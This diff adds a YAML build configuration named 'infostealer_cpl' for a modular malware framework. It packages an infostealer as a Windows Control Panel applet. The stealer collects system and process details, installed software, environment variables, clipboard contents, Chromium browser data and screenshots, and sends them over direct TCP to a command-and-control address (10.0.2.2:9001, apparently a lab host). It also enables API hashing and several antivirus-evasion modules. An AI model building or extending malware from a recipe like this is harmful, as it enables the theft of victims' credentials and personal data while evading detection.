@@ -1,0 +1,33 @@
+name: infostealer_cpl
+description: Infostealer as Control Panel applet — runs via control.exe payload.cpl
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/system_info
+  - collectors/processes
+  - collectors/installed_software
+  - collectors/env_vars
+  - collectors/clipboard
+  - collectors/browser_chromium
+  - collectors/screenshot
+
+exfil: exfil/tcp_direct
+arch: arch/dll_cpl
+
+api_resolve: api_resolve/api_hash_fnv1a
+
+resources: true
+
+evasion:
+  - evasion/entropy_pad
+  - evasion/iat_pad
+  - evasion/resource_spoof
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
